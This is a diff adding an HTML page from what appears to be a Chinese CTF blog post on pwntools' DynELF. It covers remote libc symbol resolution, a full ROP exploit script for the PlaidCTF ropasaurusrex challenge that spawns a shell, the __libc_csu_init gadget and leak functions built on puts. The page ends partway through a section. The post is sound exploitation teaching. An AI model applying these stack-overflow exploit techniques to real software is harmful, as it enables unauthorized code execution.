@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="简介对于不同版本的libc，函数首地址相对于文件开头的偏移和函数间的偏移不一定一致；如果题目不提供libc，我们通过泄露任意一个库函数地址计算出system函数地址的方法可能就不太方便了，所以这就要求我们想办法获取目标系统的libc这里介绍一种远程获取libc的方法，叫做DynELF，这是pwntools在早期版本就提供了一个解决方案——DynELF类；通俗地讲，DynELF就是通过程序漏洞泄露出">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DynELF">
+<meta property="og:url" content="http://example.com/2023/05/10/DynELF/index.html">
+<meta property="og:site_name" content="Dvgd">
+<meta property="og:description" content="简介对于不同版本的libc，函数首地址相对于文件开头的偏移和函数间的偏移不一定一致；如果题目不提供libc，我们通过泄露任意一个库函数地址计算出system函数地址的方法可能就不太方便了，所以这就要求我们想办法获取目标系统的libc这里介绍一种远程获取libc的方法，叫做DynELF，这是pwntools在早期版本就提供了一个解决方案——DynELF类；通俗地讲，DynELF就是通过程序漏洞泄露出">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/DynELF/20190706074144-7263f742-9f7e-1-16837884119273.png">
+<meta property="og:image" content="http://example.com/images/DynELF/20190706074216-852b3c14-9f7e-1-16837884466425.png">
+<meta property="article:published_time" content="2023-05-10T13:19:22.000Z">
+<meta property="article:modified_time" content="2023-05-11T07:13:48.363Z">
+<meta property="article:author" content="Dvgd">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/DynELF/20190706074144-7263f742-9f7e-1-16837884119273.png">
+
+<link rel="canonical" href="http://example.com/2023/05/10/DynELF/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>DynELF | Dvgd</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Dvgd</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Dvgd</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签<span class="badge">2</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="th fa-fw"></i>分类<span class="badge">6</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档<span class="badge">23</span></a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/05/10/DynELF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/Dvgd.jpg">
+      <meta itemprop="name" content="Dvgd">
+      <meta itemprop="description" content="Welcome to my blog.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Dvgd">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          DynELF
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-05-10 21:19:22" itemprop="dateCreated datePublished" datetime="2023-05-10T21:19:22+08:00">2023-05-10</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-05-11 15:13:48" itemprop="dateModified" datetime="2023-05-11T15:13:48+08:00">2023-05-11</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>对于不同版本的libc，函数首地址相对于文件开头的偏移和函数间的偏移不一定一致；如果题目不提供libc，我们通过泄露任意一个库函数地址计算出system函数地址的方法可能就不太方便了，所以这就要求我们想办法获取目标系统的libc<br>这里介绍一种远程获取libc的方法，叫做DynELF，这是pwntools在早期版本就提供了一个解决方案——DynELF类；<br>通俗地讲，DynELF就是通过程序漏洞泄露出任意地址内容，结合ELF文件的结构特征获取对应版本文件并计算对比出目标符号在内存中的地址</p>
+<hr>
+<h2 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">p = remote(ip, port)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">addr</span>):</span><br><span class="line">       payload2leak_addr = “****” + pack(addr) + “****”</span><br><span class="line">       p.send(payload2leak_addr)</span><br><span class="line">       data = p.recv()</span><br><span class="line">       <span class="keyword">return</span> data</span><br><span class="line"> </span><br><span class="line">d = DynELF(leak, pointer = pointer_into_ELF_file, elf = ELFObject)</span><br><span class="line">system_addr = d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line">read_add = d.lookup(<span class="string">&#x27;read&#x27;</span>,<span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line"><span class="number">1234567891011</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="局限"><a href="#局限" class="headerlink" title="局限"></a>局限</h2><p>使用DynELF时，我们需要使用一个leak函数作为必选参数，指向ELF文件的指针或者使用ELF类加载的目标文件至少提供一个作为可选参数，以初始化一个DynELF类的实例d。然后就可以通过这个实例d的方法lookup来搜寻libc库函数了；<br>其中，leak函数需要使用目标程序本身的漏洞泄露出由DynELF类传入的int型参数addr对应的内存地址中的数据。且由于DynELF会多次调用leak函数，这个函数必须能任意次使用，即不能泄露几个地址之后就导致程序崩溃。由于需要泄露数据，payload中必然包含着打印函数，如write, puts, printf等；<br>而通过实践发现write函数是最理想的，因为write函数的特点在于其输出完全由其参数size决定，只要目标地址可读，size填多少就输出多少，不会受到诸如‘\0’, ‘\n’之类的字符影响；而puts, printf函数会受到诸如‘\0’, ‘\n’之类的字符影响，在对数据的读取和处理有一定的难度</p>
+<hr>
+<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>我们以2013-PlaidCTF-ropasaurusrex这个实例来看看DynELF方法的使用，以及write函数在DynELF方法中的用法<br>我们先checksec检查其保护机制：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sir@sir-PC:/2013-PlaidCTF-ropasaurusrex$ checksec ropasaurusrex</span><br><span class="line">[*] <span class="string">&#x27;/2013-PlaidCTF-ropasaurusrex/ropasaurusrex&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">1234567</span><br></pre></td></tr></table></figure>
+
+<p>现在我们看看write函数能不能在程序中实现任意地址的读取打印,通过测试我们可以知道栈溢出到EIP需要140个字节</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">2.7</span><span class="number">.15</span> (default, May  <span class="number">1</span> <span class="number">2018</span>, 05:<span class="number">55</span>:<span class="number">50</span>) </span><br><span class="line">[GCC <span class="number">7.3</span><span class="number">.0</span>] on linux2</span><br><span class="line"><span class="type">Type</span> <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="keyword">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p = process(<span class="string">&#x27;./ropasaurusrex&#x27;</span>)</span><br><span class="line">[x] Starting local process <span class="string">&#x27;./ropasaurusrex&#x27;</span></span><br><span class="line">[+] Starting local process <span class="string">&#x27;./ropasaurusrex&#x27;</span>: pid <span class="number">21128</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>elf = ELF(<span class="string">&#x27;./ropasaurusrex&#x27;</span>)</span><br><span class="line">[*] <span class="string">&#x27;/2013-PlaidCTF-ropasaurusrex/ropasaurusrex&#x27;</span></span><br><span class="line">    Arch:     i386-<span class="number">32</span>-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x8048000</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">140</span> + p32(elf.plt[<span class="string">&#x27;write&#x27;</span>]) + p32(<span class="number">0</span>) + p32(<span class="number">1</span>) + p32(<span class="number">0x8048000</span>) + p32(<span class="number">8</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.sendline(payload)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p.recv()</span><br><span class="line">[*] Process <span class="string">&#x27;./ropasaurusrex&#x27;</span> stopped <span class="keyword">with</span> exit code -<span class="number">11</span> (SIGSEGV) (pid <span class="number">21128</span>)</span><br><span class="line"><span class="string">&#x27;\x7fELF\x01\x01\x01\x00&#x27;</span> <span class="comment">#这里很明显可以读取到0x8048000位置的内容</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line"><span class="number">1234567891011121314151617181920</span></span><br></pre></td></tr></table></figure>
+
+<p>所以我们的leak函数可以这样写：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">addr</span>):</span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">140</span> + p32(elf.plt[<span class="string">&#x27;write&#x27;</span>]) + p32(start_addr)</span><br><span class="line">    payload+= p32(<span class="number">1</span>) + p32(addr) + p32(<span class="number">8</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    context = p.recv(<span class="number">8</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%#x -&gt; %s&quot;</span> %(addr, (context <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>)))</span><br><span class="line">    <span class="keyword">return</span> context</span><br><span class="line"><span class="number">1234567</span></span><br></pre></td></tr></table></figure>
+
+<p>因为程序当中没有”&#x2F;bin&#x2F;sh”字符串，所以我们不仅需要system函数泄露出来，还需要将read函数泄露出来，方便我们写入字符串</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">d = DynELF(leak,elf = elf)</span><br><span class="line">system_addr = d.lookup(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line">read_addr = d.lookup(<span class="string">&#x27;read&#x27;</span>,<span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;system_addr: &quot;</span> + <span class="built_in">hex</span>(system_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;read_addr: &quot;</span> + <span class="built_in">hex</span>(read_addr)</span><br><span class="line"><span class="number">12345</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>所以exp就这样写：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">pro = <span class="string">&#x27;./ropasaurusrex&#x27;</span></span><br><span class="line">p = process(pro)</span><br><span class="line">elf = ELF(pro)</span><br><span class="line">start_addr = <span class="number">0x8048340</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">addr</span>):</span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">140</span> + p32(elf.plt[<span class="string">&#x27;write&#x27;</span>]) + p32(start_addr)</span><br><span class="line">    payload+= p32(<span class="number">1</span>) + p32(addr) + p32(<span class="number">8</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    context = p.recv(<span class="number">8</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%#x -&gt; %s&quot;</span> %(addr, (context <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>)))</span><br><span class="line">    <span class="keyword">return</span> context</span><br><span class="line">d = DynELF(leak,elf = elf)</span><br><span class="line">system_addr = d.lookup(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line">read_addr = d.lookup(<span class="string">&#x27;read&#x27;</span>,<span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;system_addr: &quot;</span> + <span class="built_in">hex</span>(system_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;read_addr: &quot;</span> + <span class="built_in">hex</span>(read_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">140</span> + p32(read_addr) + p32(system_addr) + p32(<span class="number">0</span>) + p32(elf.bss()+<span class="number">100</span>) + p32(<span class="number">8</span>))</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>DynELF泄露函数方法最方便的使用情况是程序中最好含有write函数等输出函数且可以多次反复调用，并且DynELF找的是字符串…</p>
+<h2 id="一、通用-Gadget"><a href="#一、通用-Gadget" class="headerlink" title="一、通用 Gadget"></a>一、通用 Gadget</h2><p>蒸米在《一步一步学ROP之linux_x64篇》中提到，在栈溢出的场景下，只要 <strong>x64</strong> 程序中调用了 <strong>libc.so</strong>，就会自带一个很好用的通用Gadget：**__libc_csu_init()**。</p>
+<p><img src="/../images/DynELF/20190706074144-7263f742-9f7e-1-16837884119273.png" alt="20190706074144-7263f742-9f7e-1"></p>
+<p>如图，先从 <strong>0x40061A</strong> 开始执行，将 <strong>rbx&#x2F;rbp&#x2F;r12&#x2F;r13&#x2F;r14&#x2F;r15</strong> 这六个寄存器全部布置好，再 <strong>ret</strong> 到 <strong>0x400600</strong> ，继续布置 <strong>rdx&#x2F;rsi&#x2F;rdi</strong>，最后通过 <strong>call qword ptr[r12+rbx*8]</strong> 执行目标函数。</p>
+<p>这个通用 <strong>Gadget</strong> 好用的地方在于，不仅可以通过函数地址的指针（通常会用记录库函数真实地址的 <strong>got</strong> 表项）来控制目标函数，还可以控制目标函数的最多三个入参（<strong>rdi&#x2F;rsi&#x2F;rdx</strong>）的值。此外，只要设置 <strong>rbp&#x3D;rbx+1</strong>而且栈空间足够，这个 <strong>Gadget</strong> 可以一直循环调用下去。</p>
+<p>计算一下一次调用需要的空间。</p>
+<p>可以看出，这个 <strong>Gadget</strong> 需要布置六个寄存器（<strong>rbx&#x2F;rbp&#x2F;r12&#x2F;r13&#x2F;r14&#x2F;r15</strong>）加一个 <strong>ret</strong> 返回地址，<strong>x64</strong> 下至少需要 <strong>56</strong> 个字节的栈空间。如果再算上将 <strong>rip</strong> 指令跳转进来（0x40061A）的一个 <strong>ret</strong> 地址，那就是 <strong>64</strong> 字节的栈空间。</p>
+<p>栈的布置如下：</p>
+<p><img src="/../images/DynELF/20190706074216-852b3c14-9f7e-1-16837884466425.png" alt="20190706074216-852b3c14-9f7e-1"></p>
+<p>在没有目标系统 libc 文件的情况下，我们可以使用 pwntools 的 DynELF 模块来泄漏地址信息，从而获取到 shell。本文针对 linux 下的 puts 和 write，分别给出了实现 DynELF 关键函数 leak 的方法，并通过 3 道 CTF 题目介绍了这些方法的具体应用情况。</p>
+<h2 id="DynELF"><a href="#DynELF" class="headerlink" title="DynELF"></a>DynELF</h2><p>DynELF 是 pwntools 中专门用来应对无 libc 情况的漏洞利用模块，其基本代码框架如下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p = process(&#x27;./xxx&#x27;)</span><br><span class="line">def leak(address):</span><br><span class="line">  #各种预处理</span><br><span class="line">  payload = &quot;xxxxxxxx&quot; + address + &quot;xxxxxxxx&quot;</span><br><span class="line">  p.send(payload)</span><br><span class="line">  #各种处理</span><br><span class="line">  data = p.recv(4)</span><br><span class="line">  log.debug(&quot;%#x =&gt; %s&quot; % (address, (data or &#x27;&#x27;).encode(&#x27;hex&#x27;)))</span><br><span class="line">  return data</span><br><span class="line">d = DynELF(leak, elf=ELF(&quot;./xxx&quot;))      #初始化DynELF模块 </span><br><span class="line">systemAddress = d.lookup(&#x27;system&#x27;, &#x27;libc&#x27;)  #在libc文件中搜索system函数的地址</span><br></pre></td></tr></table></figure>
+
+<p>需要使用者进行的工作主要集中在 leak 函数的具体实现上，上面的代码只是个模板。其中，address 就是 leak 函数要泄漏信息的所在地址，而 payload 就是触发目标程序泄漏 address 处信息的攻击代码。</p>
+<h2 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h2><p>不管有没有libc文件，要想获得目标系统的system函数地址，首先都要求目标二进制程序中存在一个能够泄漏目标系统内存中libc空间内信息的漏洞。同时，由于我们是在对方内存中不断搜索地址信息，故我们需要这样的信息泄露漏洞能够被反复调用。以下是大致归纳的主要使用条件：</p>
+<ul>
+<li>目标程序存在可以泄露libc空间信息的漏洞，如read@got就指向libc地址空间内；</li>
+<li>目标程序中存在的信息泄露漏洞能够反复触发，从而可以不断泄露libc地址空间内的信息。</li>
+</ul>
+<p>当然，以上仅仅是实现利用的基本条件，不同的目标程序和运行环境都会有一些坑需要绕过。接下来，我们主要针对write和puts这两个普遍用来泄漏信息的函数在实际配合DynELF工作时可能遇到的问题，给出相应的解决方法。</p>
+<h2 id="write-函数"><a href="#write-函数" class="headerlink" title="write 函数"></a>write 函数</h2><p>write函数原型是write(fd, addr, len)，即将addr作为起始地址，读取len字节的数据到文件流fd（0表示标准输入流stdin、1表示标准输出流stdout）。write函数的优点是可以读取任意长度的内存信息，即它的打印长度只受len参数控制，缺点是需要传递3个参数，特别是在x64环境下，可能会带来一些困扰。</p>
+<p>在x64环境下，函数的参数是通过寄存器传递的，rdi对应第一个参数，rsi对应第二个参数，rdx对应第三个参数，往往凑不出类似“pop rdi; ret”、“pop rsi; ret”、“pop rdx; ret”等3个传参的gadget。此时，可以考虑使用<strong>libc_csu_init函数的通用gadget，具体原理请参见 <a target="_blank" rel="noopener" href="http://www.cnblogs.com/Ox9A82/p/5487725.html">文章</a> 。简单的说，就是通过</strong>libc_csu_init函数的两段代码来实现3个参数的传递，这两段代码普遍存在于x64二进制程序中，只不过是间接地传递参数，而不像原来，是通过pop指令直接传递参数。</p>
+<p>第一段代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040075A   pop  rbx  #需置为0，为配合第二段代码的call指令寻址</span><br><span class="line">.text:000000000040075B   pop  rbp  #需置为1</span><br><span class="line">.text:000000000040075C   pop  r12  #需置为要调用的函数地址，注意是got地址而不是plt地址，因为第二段代码中是call指令</span><br><span class="line">.text:000000000040075E   pop  r13  #write函数的第三个参数</span><br><span class="line">.text:0000000000400760   pop  r14  #write函数的第二个参数</span><br><span class="line">.text:0000000000400762   pop  r15  #write函数的第一个参数</span><br><span class="line">.text:0000000000400764   retn</span><br></pre></td></tr></table></figure>
+
+<p>第二段代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400740   mov  rdx, r13</span><br><span class="line">.text:0000000000400743   mov  rsi, r14</span><br><span class="line">.text:0000000000400746   mov  edi, r15d</span><br><span class="line">.text:0000000000400749   call  qword ptr [r12+rbx*8]</span><br></pre></td></tr></table></figure>
+
+<p>这两段代码运行后，会将栈顶指针移动56字节，我们在栈中布置56个字节即可。</p>
+<p>这样，我们便解决了write函数在leak信息中存在的问题，具体的应用会放到后面的3道题目中讲。</p>
+<h2 id="puts-函数"><a href="#puts-函数" class="headerlink" title="puts 函数"></a>puts 函数</h2><p>puts 的原型是 puts(addr)，即将 addr 作为起始地址输出字符串，直到遇到“\x00”字符为止。也就是说，puts函数输出的数据长度是不受控的，只要我们输出的信息中包含\x00截断符，输出就会终止，且会自动将“\n”追加到输出字符串的末尾，这是puts函数的缺点，而优点就是需要的参数少，只有1个，无论在x32还是x64环境下，都容易调用。</p>
+<p>为了克服输入不受控这一缺点，我们考虑利用puts函数输出的字符串最后一位为“\n“这一特点，分两种情况来解决。</p>
+<p>1、puts 输出完后就没有其他输出 ， 在这种情况下的 leak 函数可以这么写。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">def leak(address):</span><br><span class="line">  count = 0</span><br><span class="line">  data = &#x27;&#x27;</span><br><span class="line">  payload = xxx</span><br><span class="line">  p.send(payload)</span><br><span class="line">  print p.recvuntil(&#x27;xxx\n&#x27;) #一定要在puts前释放完输出</span><br><span class="line">  up = &quot;&quot;</span><br><span class="line">  while True:</span><br><span class="line">    #由于接收完标志字符串结束的回车符后，就没有其他输出了，故先等待1秒钟，如果确实接收不到了，就说明输出结束了</span><br><span class="line">    #以便与不是标志字符串结束的回车符（0x0A）混淆，这也利用了recv函数的timeout参数，即当timeout结束后仍得不到输出，则直接返回空字符串””</span><br><span class="line">    c = p.recv(numb=1, timeout=1)</span><br><span class="line">    count += 1</span><br><span class="line">    if up == &#x27;\n&#x27; and c == &quot;&quot;:  #接收到的上一个字符为回车符，而当前接收不到新字符，则</span><br><span class="line">      buf = buf[:-1]             #删除puts函数输出的末尾回车符</span><br><span class="line">      buf += &quot;\x00&quot;</span><br><span class="line">      break</span><br><span class="line">    else:</span><br><span class="line">      buf += c</span><br><span class="line">    up = c</span><br><span class="line">  data = buf[:4]  #取指定字节数</span><br><span class="line">  log.info(&quot;%#x =&gt; %s&quot; % (address, (data or &#x27;&#x27;).encode(&#x27;hex&#x27;)))</span><br><span class="line">  return data</span><br></pre></td></tr></table></figure>
+
+<p>2、puts 输出完后还有其他输出 ， 在这种情况下的 leak 函数可以这么写。</p>
